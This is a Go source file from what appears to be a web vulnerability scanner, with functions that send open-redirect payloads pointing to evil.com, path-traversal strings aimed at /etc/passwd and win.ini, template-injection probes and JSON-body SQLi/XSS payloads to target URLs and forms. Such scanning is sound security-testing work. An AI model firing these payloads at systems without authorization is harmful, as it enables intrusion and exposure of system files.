package modules

import (
	"github.com/SentinelXofficial/sxel/pkg/payload"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ScanOpenRedirect tests for unvalidated redirect vulnerabilities
func ScanOpenRedirect(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	redirectPayloads := []string{
		"https://evil.com",
		"//evil.com",
		"/\\evil.com",
		"///evil.com",
		"https:evil.com",
		"/%09/evil.com",
		"//evil%2Ecom",
		"https://evil.com%2F%2F",
	}
	redirectParamHints := []string{
		"url", "redirect", "redirect_url", "return", "return_url",
		"next", "target", "dest", "destination", "redir",
		"redirect_to", "go", "goto", "link", "out", "continue",
		"from", "to", "back", "location", "forward", "callback",
	}

	noRedir := &http.Client{
		Timeout:   client.Timeout,
		Transport: client.Transport,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	p, _ := url.Parse(target.URL)
	params, _ := url.ParseQuery(p.RawQuery)

	for param := range params {
		lp := strings.ToLower(param)
		isHint := false
		for _, h := range redirectParamHints {
			if strings.Contains(lp, h) {
				isHint = true
				break
			}
		}
		if !isHint {
			continue
		}

	RedirectLoop:
		for _, payload := range redirectPayloads {
			testURL, _ := core.SetParam(target.URL, param, payload)
			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			core.ApplyHeaders(req, cfg)
			resp, err := noRedir.Do(req)
			if err != nil {
				continue
			}
			io.ReadAll(resp.Body) //nolint:errcheck
			resp.Body.Close()

			loc := resp.Header.Get("Location")
			if resp.StatusCode >= 300 && resp.StatusCode < 400 &&
				(strings.Contains(loc, "evil.com") || strings.Contains(loc, payload)) {
				results = append(results, core.ScanResult{
					Type: "Open Redirect", URL: testURL,
					Method: "GET", Parameter: param, Payload: payload,
					Severity: "MEDIUM",
					Evidence:  fmt.Sprintf("redirects to: %s (HTTP %d)", loc, resp.StatusCode),
					Timestamp: time.Now(),
				})
				fmt.Printf("  [OPEN-REDIRECT] param=%s -> %s\n", param, loc)
				break RedirectLoop
			}
		}
	}
	return results
}

// ScanPathTraversal tests for directory traversal vulnerabilities
func ScanPathTraversal(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	payloads := []string{
		"../../../../etc/passwd",
		"../../etc/passwd",
		"../../../etc/passwd",
		"../../../../etc/passwd%00",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252Fetc%252Fpasswd",
		"....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2fetc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"../../../../windows/win.ini",
		"..%5c..%5cwindows%5cwin.ini",
	}

	p, _ := url.Parse(target.URL)
	params, _ := url.ParseQuery(p.RawQuery)

	for param := range params {
	TraversalLoop:
		for _, payload := range payloads {
			testURL, err := core.SetParam(target.URL, param, payload)
			if err != nil {
				continue
			}
			body, _, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}
			if strings.Contains(body, "root:x:0:0") ||
				strings.Contains(body, "root:*:") ||
				strings.Contains(body, "/bin/bash") ||
				strings.Contains(body, "/bin/sh") ||
				(strings.Contains(body, "[extensions]") && strings.Contains(body, "win.ini")) {
				results = append(results, core.ScanResult{
					Type: "Path Traversal", URL: testURL,
					Method: "GET", Parameter: param, Payload: payload,
					Severity: "HIGH",
					Evidence:  "system file content found in response (/etc/passwd or win.ini)",
					Timestamp: time.Now(),
				})
				fmt.Printf("  [PATH-TRAVERSAL] param=%s payload=%q\n", param, payload)
				break TraversalLoop
			}
		}
	}
	return results
}

// ScanSSTI tests for Server-Side Template Injection
func ScanSSTI(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	type sstiTest struct {
		payload  string
		expected string
		engine   string
	}
	tests := []sstiTest{
		{"{{7*7}}", "49", "Jinja2/Twig"},
		{"${7*7}", "49", "FreeMarker/EL/Velocity"},
		{"<%= 7*7 %>", "49", "ERB/EJS"},
		{"#{7*7}", "49", "Ruby Liquid"},
		{"*{7*7}", "49", "Spring EL"},
		{"{{7*'7'}}", "7777777", "Jinja2"},
		{"${{7*7}}", "49", "Pebble/Twirl"},
	}

	p, _ := url.Parse(target.URL)
	params, _ := url.ParseQuery(p.RawQuery)

	for param := range params {
		// Get a baseline to know what the param normally echoes
		baseURL, _ := core.SetParam(target.URL, param, "vulntest1234")
		baseline, _, _ := core.DoGET(client, cfg, baseURL)
		echoesValue := strings.Contains(baseline, "vulntest1234")

		for _, t := range tests {
			testURL, err := core.SetParam(target.URL, param, t.payload)
			if err != nil {
				continue
			}
			body, _, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}
			// Must contain evaluated result that was NOT already in the baseline,
			// AND must not merely reflect the literal payload string unchanged
			if strings.Contains(body, t.expected) && !strings.Contains(baseline, t.expected) && (!echoesValue || !strings.Contains(body, t.payload)) {
				results = append(results, core.ScanResult{
					Type: fmt.Sprintf("Server-Side Template Injection [%s]", t.engine),
					URL:  testURL, Method: "GET", Parameter: param,
					Payload:  t.payload, Severity: "HIGH",
					Evidence:  fmt.Sprintf("expression %q evaluated to %q", t.payload, t.expected),
					Timestamp: time.Now(),
				})
				fmt.Printf("  [SSTI] param=%s engine=%s payload=%q\n", param, t.engine, t.payload)
				break
			}
		}
	}

	// Test forms too
	for _, form := range target.Forms {
		for _, inp := range form.Inputs {
			// Fetch a baseline response for this input so we can verify the evaluated
			// result was not already present in the page before injection
			var formBaseline string
			dBase := core.FormDefaults(form)
			if form.Method == "POST" {
				formBaseline, _, _ = core.DoPOST(client, cfg, form.Action, dBase)
			} else {
				if u, err := core.SetParam(form.Action, inp.Name, "vulntest1234"); err == nil {
					formBaseline, _, _ = core.DoGET(client, cfg, u)
				}
			}

			for _, t := range tests {
				d := core.FormDefaults(form)
				d.Set(inp.Name, t.payload)
				var body string
				var err error
				if form.Method == "POST" {
					body, _, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					u, _ := core.SetParam(form.Action, inp.Name, t.payload)
					body, _, err = core.DoGET(client, cfg, u)
				}
				if err != nil {
					continue
				}
				// Flag only if evaluated result appears AND was NOT already in baseline
				if strings.Contains(body, t.expected) && !strings.Contains(formBaseline, t.expected) && !strings.Contains(body, t.payload) {
					results = append(results, core.ScanResult{
						Type: fmt.Sprintf("SSTI via core.Form [%s]", t.engine),
						URL:  form.Action, Method: form.Method, Parameter: inp.Name,
						Payload:  t.payload, Severity: "HIGH",
						Evidence:  fmt.Sprintf("expression %q evaluated to %q", t.payload, t.expected),
						Timestamp: time.Now(),
					})
					fmt.Printf("  [SSTI-FORM] %s input=%s engine=%s\n", form.Action, inp.Name, t.engine)
					break
				}
			}
		}
	}

	return results
}

// ScanJSONInjection tests POST endpoints with JSON content-type for SQLi/XSS
func ScanJSONInjection(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// Guarded slice limits — prevents panic if payload lists are trimmed below these thresholds
	sqliLimit := 10
	if len(payload.SQLiPayloads) < sqliLimit {
		sqliLimit = len(payload.SQLiPayloads)
	}
	xssLimit := 8
	if len(payload.XSSPayloads) < xssLimit {
		xssLimit = len(payload.XSSPayloads)
	}

	for _, form := range target.Forms {
		if form.Method != "POST" || len(form.Inputs) == 0 {
			continue
		}
		for _, inp := range form.Inputs {
		JSONSQLiLoop:
			for _, p := range payload.SQLiPayloads[:sqliLimit] {
				// Use json.Marshal for correct escaping (handles backslashes, etc.)
				bodyBytes, err := json.Marshal(map[string]string{inp.Name: p})
				if err != nil {
					continue
				}
				req, err := http.NewRequest("POST", form.Action, strings.NewReader(string(bodyBytes)))
				if err != nil {
					continue
				}
				core.ApplyHeaders(req, cfg)
				req.Header.Set("Content-Type", "application/json")
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				b, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				if ev := DetectSQLi(string(b)); ev != "" {
					results = append(results, core.ScanResult{
						Type: "SQL Injection via JSON Body", URL: form.Action,
						Method: "POST/JSON", Parameter: inp.Name, Payload: p,
						Severity: "HIGH", Evidence: ev, Timestamp: time.Now(),
					})
					fmt.Printf("  [JSON-SQLI] %s field=%s\n", form.Action, inp.Name)
					break JSONSQLiLoop
				}
			}

		JSONXSSLoop:
			for _, p := range payload.XSSPayloads[:xssLimit] {
				// Use json.Marshal for correct escaping
				bodyBytes, err := json.Marshal(map[string]string{inp.Name: p})
				if err != nil {
					continue
				}
				req, err := http.NewRequest("POST", form.Action, strings.NewReader(string(bodyBytes)))
				if err != nil {
					continue
				}
				core.ApplyHeaders(req, cfg)
				req.Header.Set("Content-Type", "application/json")
				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				b, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				if strings.Contains(string(b), p) {
					results = append(results, core.ScanResult{
						Type: "XSS via JSON Body", URL: form.Action,
						Method: "POST/JSON", Parameter: inp.Name, Payload: p,
						Severity: "MEDIUM", Evidence: "payload reflected from JSON body",
						Timestamp: time.Now(),
					})
					fmt.Printf("  [JSON-XSS] %s field=%s\n", form.Action, inp.Name)
					break JSONXSSLoop
				}
			}
		}
	}
	return results
}
